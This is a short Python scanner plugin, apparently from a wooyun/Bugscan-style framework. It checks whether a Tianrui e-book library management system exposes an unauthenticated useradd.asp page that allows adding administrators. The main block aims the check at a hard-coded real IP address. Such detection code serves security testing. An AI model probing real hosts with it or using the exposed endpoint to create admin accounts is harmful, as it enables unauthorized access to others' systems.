#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:天睿电子图书管理系统任意增加管理员
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0121549
#Author:xq17

def assign(service,arg):
    if service=="tianrui_lib":
        return True,arg
    
def audit(arg):
    payload = "useradd.asp"
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl(url)

    if code !=0 and 'password' in res and 'reset' in res:
        security_hole('find bug: ' + arg)

               
if  __name__ == '__main__':
    from dummy import *
    audit(assign("tianrui_lib","http://218.92.71.5:1085/trebook/")[1])